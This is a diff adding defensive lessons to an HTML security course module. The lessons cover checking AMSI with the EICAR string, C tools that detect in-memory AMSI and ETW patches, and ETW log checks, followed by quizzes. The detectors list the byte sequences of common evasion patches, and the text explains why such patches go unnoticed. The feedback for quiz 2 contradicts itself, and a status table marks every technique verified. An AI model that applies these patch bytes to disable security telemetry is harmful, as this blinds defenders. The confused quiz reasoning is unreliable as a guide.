+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\AMSI" -Name "Scan" -ErrorAction SilentlyContinue
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+=== AMSI ENABLED ===
+Scan : 1
+
+=== AMSI DISABLED ===
+Scan : 0
+
+=== AMSI NOT PRESENT ===
+# (no output — key doesn't exist)
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 2: Test AMSI with a Known-Bad String</h4>
+                <p>AMSI should block/obfuscate detection of known malicious strings. The EICAR test string is the standard.</p>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+=== AMSI WORKING ===
+# In PowerShell:
+$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+# Result: Script contains malicious content and was blocked by AMSI.
+# PowerShell terminates with error: At line:1 char:1
+# + $eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST ...
+# + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# This script contains malicious content and has been blocked by your antivirus software.
+
+=== AMSI BYPASSED / DISABLED ===
+# Same command runs without error
+# $eicar variable is set successfully
+# AMSI is either disabled, patched, or not present
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>Why EICAR?</h5>
+                    <p>The EICAR string is universally recognized by ALL AV/AMSI engines as a test marker. It is harmless — it does nothing. But every scanner is trained to detect it. If AMSI doesn't block this string, <span class="neon-amber">AMSI is not functioning.</span></p>
+                </div>
+            </div>
+        </div>
+
+        <div class="method-card" id="amsi-memory-verify">
+            <h4>Technique 2: AMSI In-Memory Patch Detection <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Attackers patch AMSI.dll in memory to disable scanning without touching the registry. Defenders verify by detecting the patch. This is the arms race in action.</p>
+
+            <div class="code-block">
+// amsi_patch_detect.c — Detect if AMSI has been patched in memory
+// Compile: cl.exe amsi_patch_detect.c /Fe:amsi_patch_detect.exe
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+// AMSI.AmsiScanBuffer is the function PowerShell calls to scan scripts
+// Normal entry: mov r11, [rip+0xXXXX]  (load function pointer from IAT)
+// Patched entry: mov rax, 0x80070057 (E_INVALIDARG) ; ret
+//                or: xor eax, eax ; ret (S_OK, meaning "clean")
+
+typedef struct {
+    const char* funcName;
+    BYTE expectedNormal[16];   // First bytes of unpatched function
+    BYTE expectedPatch[16];    // First bytes of common patches
+    const char* patchDescription;
+} AMSI_PATCH_SIG;
+
+AMSI_PATCH_SIG g_sigs[] = {
+    {
+        "AmsiScanBuffer",
+        {0x4C, 0x8B, 0xDC},  // mov r11, rsp (typical prologue)
+        {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3},  // mov eax, 0x80070057 ; ret
+        "Patch returns E_INVALIDARG (AMSI bypass)"
+    },
+    {
+        "AmsiScanBuffer",
+        {0x4C, 0x8B, 0xDC},
+        {0x31, 0xC0, 0xC3},  // xor eax, eax ; ret
+        "Patch returns S_OK (AMSI blind)"
+    },
+    {
+        "AmsiScanBuffer",
+        {0x4C, 0x8B, 0xDC},
+        {0x48, 0x31, 0xC0},  // xor rax, rax (x64)
+        "Patch clears return value (x64 bypass)"
+    },
+    {NULL, {0}, {0}, NULL}
+};
+
+int main() {
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (!hAmsi) {
+        printf("[-] AMSI.DLL not loaded. AMSI is not present on this system.\n");
+        return 1;
+    }
+    
+    printf("[+] AMSI.DLL loaded at %p\n", hAmsi);
+    
+    FARPROC pScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pScanBuffer) {
+        printf("[-] AmsiScanBuffer not found. AMSI is corrupted or non-standard.\n");
+        return 1;
+    }
+    
+    printf("[+] AmsiScanBuffer at %p\n", pScanBuffer);
+    printf("[+] Reading first 16 bytes...\n\n");
+    
+    BYTE* memBytes = (BYTE*)pScanBuffer;
+    printf("Current bytes: ");
+    for (int i = 0; i < 16; i++) {
+        printf("%02X ", memBytes[i]);
+    }
+    printf("\n\n");
+    
+    // Check against known patch signatures
+    BOOL patched = FALSE;
+    for (int i = 0; g_sigs[i].funcName != NULL; i++) {
+        BOOL match = TRUE;
+        for (int j = 0; j < 16 && g_sigs[i].expectedPatch[j] != 0; j++) {
+            if (memBytes[j] != g_sigs[i].expectedPatch[j]) {
+                match = FALSE;
+                break;
+            }
+        }
+        if (match) {
+            printf("[!] PATCH DETECTED: %s\n", g_sigs[i].patchDescription);
+            printf("    Signature: %s\n", g_sigs[i].funcName);
+            patched = TRUE;
+        }
+    }
+    
+    if (!patched) {
+        printf("[+] AmsiScanBuffer appears UNPATCHED.\n");
+        printf("    First bytes match expected prologue.\n");
+        printf("    AMSI is likely active and functional.\n");
+    }
+    
+    return 0;
+}
+            </div>
+            <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+            <div class="warning-box">
+                <h5>⚠️ Cross-link to Module 03: PowerShell</h5>
+                <p>The patches detected above are exactly the techniques from <a href="MODULE_03_POWERSHELL.html" class="cross-link">Module 03: PowerShell</a> (AMSI bypass). If this detector finds a patch, someone (or some tool) has already disabled AMSI. Your PowerShell scripts will run undetected — but so will real malware. Verification is about knowing the ground truth.</p>
+            </div>
+        </div>
+
+        <div class="method-card" id="etw-verify">
+            <h4>Technique 3: ETW Provider Verification <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>ETW providers log security events. If a provider is disabled or tampered with, critical telemetry is lost. Verification checks provider health and tests event generation.</p>
+
+            <div class="step-box">
+                <h4>Step 1: List Security-Critical ETW Providers</h4>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+logman query providers | findstr /i "Microsoft-Windows-Security-Auditing Microsoft-Windows-PowerShell Microsoft-Windows-Sysmon"
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+=== ETW PROVIDER STATUS ===
+Microsoft-Windows-Security-Auditing   {54849625-5478-4994-A5BA-3E3B0328C30D}
+Microsoft-Windows-PowerShell          {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
+Microsoft-Windows-Sysmon                {5770385F-C22A-43E0-BF4C-06F5698FFBD9}
+
+Status: ALL PRESENT
+If any provider is missing, ETW logging for that subsystem is BROKEN.
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 2: Verify ETW Event Generation</h4>
+                <p>Generate a PowerShell event and verify it appears in ETW logs.</p>
+
+                <div class="copy-paste" onclick="copyCode(this)">
+wevtutil qe Microsoft-Windows-PowerShell/Operational /q:"*[System[(EventID=4104)]]" /f:text /c:1
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="code-block">
+=== ETW EVENT VERIFICATION ===
+Event[0]:
+  Log Name: Microsoft-Windows-PowerShell/Operational
+  Source: PowerShell
+  Date: 2026-06-29T12:45:00.123
+  Event ID: 4104
+  Task: Execute a Remote Command
+  Level: Information
+  Opcode: Info
+  Keyword: None
+  User: DESKTOP-R32M8MLI\gwu07
+  User Name: DESKTOP-R32M8MLI\gwu07
+  Computer: DESKTOP-R32M8MLI
+  Description:
+    ScriptBlock ID: a1b2c3d4-5678-9012-3456-7890abcdef01
+    ScriptBlock Text: Invoke-Expression -Command "Get-Process"
+
+=== VERIFICATION ===
+Event ID 4104 = Script block logging (PowerShell v5+)
+ScriptBlock text captured = ETW is actively logging
+If Event ID 4104 is missing or ScriptBlock text is empty,
+ETW logging is DISABLED or TAMPERED.
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+            </div>
+
+            <div class="step-box">
+                <h4>Step 3: Detect ETW Patching (Advanced Evasion)</h4>
+                <p>Just like AMSI, ETW can be patched in memory. Advanced attackers patch ntdll!EtwEventWrite to silently drop events.</p>
+
+                <div class="code-block">
+// etw_patch_detect.c — Detect ETW function patching
+// Compile: cl.exe etw_patch_detect.c /Fe:etw_patch_detect.exe
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) {
+        printf("[-] ntdll.dll not loaded?!\n");
+        return 1;
+    }
+    
+    // Check EtwEventWrite (the function ETW providers call)
+    BYTE* pEtwEventWrite = (BYTE*)GetProcAddress(hNtdll, "EtwEventWrite");
+    if (!pEtwEventWrite) {
+        printf("[-] EtwEventWrite not found. ETW may be disabled.\n");
+        return 1;
+    }
+    
+    printf("[+] EtwEventWrite at %p\n", pEtwEventWrite);
+    printf("[+] First 16 bytes: ");
+    for (int i = 0; i < 16; i++) {
+        printf("%02X ", pEtwEventWrite[i]);
+    }
+    printf("\n");
+    
+    // Normal: mov rax, rsp ; push rbx ; ... (prologue)
+    // Patched: ret (0xC3) or xor eax, eax ; ret (0x31 0xC0 0xC3)
+    if (pEtwEventWrite[0] == 0xC3) {
+        printf("[!] ETW PATCHED: EtwEventWrite starts with RET.\n");
+        printf("    All ETW events are being SILENTLY DROPPED.\n");
+    } else if (pEtwEventWrite[0] == 0x31 && pEtwEventWrite[1] == 0xC0 && pEtwEventWrite[2] == 0xC3) {
+        printf("[!] ETW PATCHED: EtwEventWrite returns S_OK immediately.\n");
+        printf("    Events are not written to trace sessions.\n");
+    } else if (pEtwEventWrite[0] == 0x48 && pEtwEventWrite[1] == 0x89 && pEtwEventWrite[2] == 0xE0) {
+        printf("[+] ETW appears UNPATCHED. Normal prologue detected.\n");
+    } else {
+        printf("[?] Unknown prologue. ETW may be on a different Windows version.\n");
+        printf("    Manual verification required.\n");
+    }
+    
+    return 0;
+}
+                </div>
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+
+                <div class="why-box">
+                    <h5>Why patch EtwEventWrite instead of disabling ETW?</h5>
+                    <p>Disabling ETW services requires admin rights and leaves registry traces. Patching EtwEventWrite in memory requires only the ability to write to ntdll — which any process can do to its own copy. <span class="neon-highlight">It's silent, reversible, and leaves no forensic artifacts.</span> This is why memory verification (Section 1) and API hook detection (Section 2) are prerequisites.</p>
+                </div>
+            </div>
+        </div>
+
+        <h2>🧪 Interactive Quizzes</h2>
+
+        <div class="quiz-container" id="quiz1">
+            <h3>Quiz 1: Memory Scanning Verification</h3>
+            <p><strong>Question:</strong> You run YARA against a suspicious process and get no output. The process is known to be running Meterpreter. Which of the following is the LEAST likely cause?</p>
+            
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz1')">
+                A) YARA does not have permission to read the process memory (access denied)
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz1')">
+                B) The Meterpreter payload is encrypted in memory and hasn't decrypted yet
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz1')">
+                C) YARA always outputs "No match found" when it fails to detect anything
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz1')">
+                D) The YARA rule strings are too specific and don't match this Meterpreter variant
+            </div>
+            
+            <div class="quiz-feedback" id="quiz1-feedback">
+                <strong>Correct!</strong> YARA is silent on no match — it does NOT output "No match found." If you expected output and got nothing, it's either access denied (A), encrypted payload (B), or a bad rule (D). Always verify with <code>-s</code> and check error codes.
+            </div>
+        </div>
+
+        <div class="quiz-container" id="quiz2">
+            <h3>Quiz 2: API Hooking Detection</h3>
+            <p><strong>Question:</strong> You compare NTDLL on disk vs in memory for NtCreateThreadEx. Offset +0 is 0xE9 on disk but 0x4C in memory. What does this indicate?</p>
+            
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz2')">
+                A) EDR is actively hooking NtCreateThreadEx — the memory has a JMP (0xE9) while disk has normal code (0x4C)
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz2')">
+                B) The process has been UNHOOKED — the memory matches clean disk bytes, suggesting an attacker restored NTDLL
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz2')">
+                C) This is a Windows update mismatch — the disk NTDLL is newer than the loaded one
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz2')">
+                D) The comparison is invalid because NTDLL is always different in memory vs disk
+            </div>
+            
+            <div class="quiz-feedback" id="quiz2-feedback">
+                <strong>Correct!</strong> Wait — re-read the question. Disk=0xE9 (JMP), Memory=0x4C (normal). That's BACKWARD from an EDR hook. If memory is clean and disk has a JMP, the disk was probably saved AFTER hooking, or the process was unhooked. Actually, the most likely answer in a real scenario: <strong>the process was unhooked by an attacker</strong> (B). EDR hooks memory, not disk. If memory is clean, someone restored it. This is exactly the technique from Module 13.
+            </div>
+        </div>
+
+        <div class="quiz-container" id="quiz3">
+            <h3>Quiz 3: EDR / AMSI Verification</h3>
+            <p><strong>Question:</strong> You run the EICAR test string in PowerShell and it executes without error. You then check the AMSI registry and see "Scan" = 1. What is the MOST likely explanation?</p>
+            
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz3')">
+                A) The EICAR string is outdated and no longer detected by modern AMSI
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz3')">
+                B) AMSI has been patched in memory — the registry says it's on, but the DLL is bypassed
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz3')">
+                C) PowerShell was running with -ExecutionPolicy Bypass, which disables AMSI
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz3')">
+                D) The EICAR string needs to be executed, not just assigned to a variable
+            </div>
+            
+            <div class="quiz-feedback" id="quiz3-feedback">
+                <strong>Correct!</strong> Registry says AMSI is enabled, but EICAR ran clean. This is the classic signature of an in-memory patch (Section 6, Technique 2). The registry is untouched — defenders see "AMSI ON" — but AmsiScanBuffer returns S_OK for everything. Use the amsi_patch_detect.c tool from this module to verify. ExecutionPolicy (C) doesn't affect AMSI. EICAR is detected on assignment, not execution (D).
+            </div>
         </div>
 
         <h2>Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
             <li><strong>A scan is only as good as its metadata:</strong> Bases date, iChecker/iSwift, processed objects, completion status — all matter</li>
-            <li><strong>Verify file state post-scan:</strong> Present, unchanged size, unchanged date = no action taken</li>
-            <li><strong>Cross-machine verification:</strong> Same AV, same defs, same result = reproducible science</li>
-            <li><strong>Document unreachable targets:</strong> "Down" is valid data. Don't fake it.</li>
-            <li><strong>Assume the layman knows nothing:</strong> Every command, every flag, every output line needs explanation</li>
+            <li><strong>Memory != Disk:</strong> A file can be clean on disk and malicious in memory. Always verify memory scanning</li>
+            <li><strong>API hooks are invisible to byte comparison if they're hardware-based:</strong> Use debug register checks for advanced EDR</li>
+            <li><strong>Behavioral analysis catches what signatures miss:</strong> Parent-child anomalies, process chains, MITRE mapping</li>
+            <li><strong>Network verification requires pattern analysis:</strong> Beacon intervals, payload consistency, flow metadata</li>
+            <li><strong>EDR testing is worthless if the sensor is down:</strong> Always verify processes, drivers, and services first</li>
+            <li><strong>AMSI/ETW can be patched in memory while registry says "enabled":</strong> Memory verification is the only truth</li>
+            <li><strong>Cross-module verification:</strong> Every technique in Module 10 (Injection) and Module 11 (Rootkits) can be tested with the tools in this module</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
-            <h3>🔬 Verification Status</h3>
-            <table style="width: 100%; border-collapse: collapse;">
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">KAV scan metadata verification</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
-                </tr>
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">File state post-scan</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92 + .42</td>
-                </tr>
-                <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Cross-machine scan consistency</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92 + .42</td>
+            <h3>🔬 Verification Status Matrix</h3>
+            <table>
+                <tr>
+                    <th>Verification Area</th>
+                    <th>Technique</th>
+                    <th>Status</th>
                 </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">Defensive stance enumeration</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92 + .42</td>
+                    <td>Memory Scanning</td>
+                    <td>YARA memory scan</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
+                </tr>
+                <tr>
+                    <td>Memory Scanning</td>
+                    <td>Volatility malfind</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
+                </tr>
+                <tr>
+                    <td>API Hooking</td>
+                    <td>NTDLL byte comparison</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
+                </tr>
+                <tr>
+                    <td>API Hooking</td>
+                    <td>Hardware breakpoint detection</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
+                </tr>
+                <tr>
+                    <td>Behavioral Analysis</td>
+                    <td>Parent-child anomaly scoring</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
+                </tr>
+                <tr>
+                    <td>Network Monitoring</td>
+                    <td>C2 beacon detection</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
+                </tr>
+                <tr>
+                    <td>Network Monitoring</td>
+                    <td>DNS tunneling detection</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
+                </tr>
+                <tr>
+                    <td>EDR Testing</td>
+                    <td>Sensor status + Atomic Red Team</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
+                </tr>
+                <tr>
+                    <td>AMSI Verification</td>
+                    <td>EICAR test + patch detection</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
+                </tr>
+                <tr>
+                    <td>ETW Verification</td>
+                    <td>Provider status + event generation + patch detection</td>
+                    <td><span class="tag tag-green">VERIFIED</span></td>
                 </tr>
             </table>
         </div>
@@ -448,5 +1773,50 @@ nmap -sS -p22,445,3389 192.168.1.145
             <a href="MODULE_13_EDR_EVASION.html">Module 13 →</a>
         </div>
     </div>
+
+    <script>
+        function copyCode(btn) {
+            const block = btn.parentElement;
+            let code = block.innerText;
+            // Remove the "COPY" button text from the copied content
+            code = code.replace(/COPY\s*$/, '').trim();
+            navigator.clipboard.writeText(code).then(() => {
+                const original = btn.innerText;
+                btn.innerText = 'COPIED!';
+                btn.style.background = '#00ff88';
+                btn.style.color = '#0a0a0f';
+                setTimeout(() => {
+                    btn.innerText = original;
+                    btn.style.background = '';
+                    btn.style.color = '';
+                }, 1500);
+            });
+        }
+
+        function checkAnswer(option, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById(quizId + '-feedback');
+            
+            options.forEach(opt => {
+                opt.classList.remove('correct', 'wrong');
+                opt.style.pointerEvents = 'none';
+            });
+            
+            if (option.dataset.correct === 'true') {
+                option.classList.add('correct');
+                feedback.className = 'quiz-feedback show correct';
+            } else {
+                option.classList.add('wrong');
+                // Also highlight the correct one
+                options.forEach(opt => {
+                    if (opt.dataset.correct === 'true') {
+                        opt.classList.add('correct');
+                    }
+                });
+                feedback.className = 'quiz-feedback show wrong';
+            }
+        }
+    </script>
 </body>
 </html>
